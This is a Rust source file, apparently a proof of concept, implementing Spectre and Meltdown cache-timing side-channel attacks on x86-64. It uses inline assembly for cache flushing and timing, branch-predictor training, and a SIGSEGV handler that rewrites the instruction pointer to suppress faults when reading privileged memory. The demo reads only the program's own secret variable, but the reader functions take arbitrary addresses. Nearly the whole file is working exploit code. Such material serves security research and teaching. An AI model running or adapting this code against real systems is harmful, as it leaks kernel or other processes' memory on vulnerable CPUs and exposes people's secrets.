#![feature(asm)]

use std::num::Wrapping;

use rand::seq::SliceRandom;
use rand::thread_rng;

use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};

const MULTIPLE_OFFSET: usize = 8192;
const CACHE_LINE_SIZE: usize = 4096;
const NB_CYCLES_TRAIN: u64 = 1000;
const NB_TIMES: usize = 1000;
const ZERO_TRESHOLD: usize = 996;

static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096] =
    [0; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096];
static mut LATENCIES: [u64; 256] = [0; 256];

static mut BASE_ADDR: usize = 0;
static mut NB_CYCLES: u64 = 0;
static mut SPECTRE_LIMIT: u64 = 64;
static mut SECRET: &[u8] =
    "0000000000000000000000000000000000000000000000000000000000000000ILIKEDEADBEEF".as_bytes();
static mut OTHER_SECRET: u64 = 0xfedcba9876543210;

extern "C" fn handle_sigsegv(
    _signal: libc::c_int,
    _info: *mut libc::siginfo_t,
    arg: *mut libc::c_void,
) {
    let mut context = unsafe { (arg as *mut libc::ucontext_t).as_mut().unwrap() };
    // very verbose, only uncomment if you want to see that you're leaking data from privileged
    // addresses that you cannot access
    /*
    use std::convert::TryFrom;
    let offending_address =
        unsafe { (*_info)._pad[1] as usize | (((*_info)._pad[2] as usize) << 32) };
    println!(
        "Got {:?} with offending_addres 0x{:x}, ignoring",
        Signal::try_from(_signal).unwrap(),
        offending_address
    );
    */
    // overwrite RIP to jump to our trampoline (REG_RIP = 16)
    // 15 is the width needed to encode the instructions in release mode,
    // let's set it to 25 and be done with it!
    context.uc_mcontext.gregs[16] += 25;
}

#[inline(always)]
fn flush_measurement_area() {
    unsafe {
        for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
            core::arch::x86_64::_mm_clflush(
                (BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
            );
        }
    }
}

#[inline(always)]
fn measure_time_to_read(address: usize) -> u64 {
    let delta_tsc;
    unsafe {
        asm!("mfence", "lfence", "rdtsc", "lfence", "shl rdx, $32", "or rax, rdx", "mov rcx, rax",
             "movzx r9, byte ptr [{0}]",
             "mfence", "lfence",  "rdtsc", "shl rdx, $32", "or rax, rdx", "sub rax, rcx",
             in(reg) address,
             out("rdx") _, out("rcx") _, out("rax") delta_tsc, out("r9") _);
    }

    delta_tsc
}

#[inline(always)]
fn measure_byte() -> Option<u8> {
    let mut v: Vec<u8> = (0..=255).collect();
    v.shuffle(&mut thread_rng());

    unsafe {
        for i in 0..256 {
            let count_addr = BASE_ADDR as usize + v[i] as usize * MULTIPLE_OFFSET;
            LATENCIES[v[i] as usize] = measure_time_to_read(count_addr);
        }

        LATENCIES
            .iter()
            .enumerate()
            .min_by(|(_, x), (_, y)| x.cmp(y))
            // the access should take less than NB_CYCLES CPU cycles
            .filter(|(_, &x)| x < NB_CYCLES)
            .map(|(x, _)| x as u8)
    }
}

#[inline(always)]
unsafe fn access_memory(target_adress: usize) {
    asm!(
        "mov rax, {0}", "movzx rax, byte ptr [rax]", "imul rax, {2}", "add rax, {1}", "movzx rax, byte ptr [rax]",
         // nop sled for the signal handler to skip the access upon segfault
         "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
         in(reg) target_adress, in(reg) BASE_ADDR, in(reg) MULTIPLE_OFFSET, out("rbx") _, out("rax") _);
}

#[inline(always)]
fn repeat_move_for_training_meltdown() {
    unsafe {
        let train_addr = &TEST_ARR[0] as *const u8 as usize;

        for _ in 0..392 {
            asm!(
                "mov rax, rcx", "movzx rax, byte ptr [rax]",
                in("rcx") train_addr, out("rax") _);
        }
    }
}

unsafe fn meltdown(preload_op: unsafe fn(), target_adress: *const u8, nb_bytes: usize) -> Vec<u8> {
    sigaction(
        Signal::SIGSEGV,
        &SigAction::new(
            SigHandler::SigAction(handle_sigsegv),
            SaFlags::empty(),
            SigSet::empty(),
        ),
    )
    .unwrap();

    let mut res: Vec<u8> = Vec::with_capacity(nb_bytes);

    for i in 0..nb_bytes {
        let mut histogram = [0usize; 256];

        for _ in 0..NB_TIMES {
            // load the data that must be accessed in cache
            preload_op();

            flush_measurement_area();

            repeat_move_for_training_meltdown();

            access_memory(target_adress as usize + i);

            let leaked_byte = measure_byte().unwrap_or(0);
            histogram[leaked_byte as usize] += 1;
        }

        if histogram[0] > ZERO_TRESHOLD {
            //println!("{:?}", histogram);
            res.push(0);
        } else {
            res.push(
                histogram[1..]
                    .iter()
                    .enumerate()
                    .max_by(|(_, x), (_, y)| x.cmp(y))
                    .map(|(x, _)| x as u8 + 1)
                    .unwrap(),
            )
        }
    }

    res
}

#[inline(always)]
unsafe fn spectre_test(off: usize) {
    let secret_base = &SECRET[0] as *const _ as usize;
    let base_addr = BASE_ADDR;
    // we can only read the first SPECTRE_LIMIT bytes, so we're safe, right?
    // Right!?
    asm!(
        // if off <= SPECTRE_LIMIT {
        "mov rcx, [rcx]", "cmp rcx, {2}", "ja 2f",
        // read_volatile(BASE_ADDR[SECRET[off]*MULTIPLE_OFFSET])
            // rbx = SECRET[off]
            "movzx rbx, byte ptr [rax+{0}]",
            // rbx = SECRET[off]*MULTIPLE_OFFSET
            "imul rbx, {multiple_offset}",
            // rax = *(BASE_ADDR+SECRET[off]*MULTIPLE_OFFSET)
            "movzx rax, byte ptr [{1}+rbx]",
        // end of loop
        "2:",
        in(reg) secret_base, in(reg) base_addr, in(reg) off, multiple_offset = const MULTIPLE_OFFSET, inout("rax") off => _, inout("rcx") &SPECTRE_LIMIT => _, out("rbx") _);
}

unsafe fn spectre(preload_op: unsafe fn(), address: usize, nb_bytes: usize) -> Vec<u8> {
    let target = (Wrapping(address) - Wrapping(&SECRET[0] as *const _ as usize)).0;
    let limit = SPECTRE_LIMIT as usize;

    let mut res = Vec::new();
    for i in 0..nb_bytes {
        let mut found = false;
        for _ in 0..100 {
            // training phase
            for i in 0..500_000 {
                spectre_test(i % limit);
            }

            // attack phase
            flush_measurement_area();
            std::arch::x86_64::_mm_prefetch(
                SECRET as *const _ as *const i8,
                std::arch::x86_64::_MM_HINT_T0,
            );
            std::arch::x86_64::_mm_prefetch(
                &BASE_ADDR as *const usize as *const i8,
                std::arch::x86_64::_MM_HINT_T0,
            );
            std::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const u64 as *const u8);

            preload_op();
            asm!("mfence", "lfence");

            spectre_test(target + i);

            let measured_byte = measure_byte().unwrap_or(0);
            if measured_byte != 0 {
                res.push(measured_byte);
                found = true;
                break;
            }
        }
        if !found {
            res.push(0);
        }
    }

    res
}

fn read_ptr_meltdown(preload_op: unsafe fn(), target_adress: usize) -> usize {
    let vec = unsafe { meltdown(preload_op, target_adress as *const u8, 8) };
    vec.iter()
        .enumerate()
        .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
}

fn read_ptr_spectre(preload_op: unsafe fn(), target_adress: usize) -> usize {
    let vec = unsafe { spectre(preload_op, target_adress, 8) };
    vec.iter()
        .enumerate()
        .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
}

fn setup_measurements() {
    unsafe {
        let base_addr = TEST_ARR.as_ptr() as usize;
        // align on a cache line size
        BASE_ADDR =
            (base_addr + 4096 + CACHE_LINE_SIZE) & (0xffffffffffffffff - CACHE_LINE_SIZE + 1);

        // prefetch
        for i in 0..TEST_ARR.len() {
            TEST_ARR[i] = 127;
        }

        std::ptr::read_volatile(BASE_ADDR as *const u8);
        let mut read_cached_time = 0;
        for _ in 0..NB_CYCLES_TRAIN {
            read_cached_time += measure_time_to_read(BASE_ADDR);
        }
        read_cached_time /= NB_CYCLES_TRAIN;

        let mut read_flushed_time = 0;
        for _ in 0..NB_CYCLES_TRAIN {
            std::arch::x86_64::_mm_clflush(BASE_ADDR as *mut u8);
            read_flushed_time += measure_time_to_read(BASE_ADDR);
        }
        read_flushed_time /= NB_CYCLES_TRAIN;

        NB_CYCLES = std::cmp::min(
            200,
            std::cmp::max(
                160,
                read_cached_time + (read_flushed_time - read_cached_time) / 2,
            ),
        );

        println!(
            "time to read a:\n- cached entry: {}\n- cold entry: {}\nFixing the treshold at {} cycles",
            read_cached_time, read_flushed_time, NB_CYCLES
        );
    };
}

fn main() {
    setup_measurements();

    println!(
        "With Spectre: 0x{:x}",
        read_ptr_spectre(|| {}, unsafe { &OTHER_SECRET as *const _ as usize })
    );

    println!(
        "With Meltdown: 0x{:x}",
        read_ptr_meltdown(|| {}, unsafe { &OTHER_SECRET as *const _ as usize })
    );
}
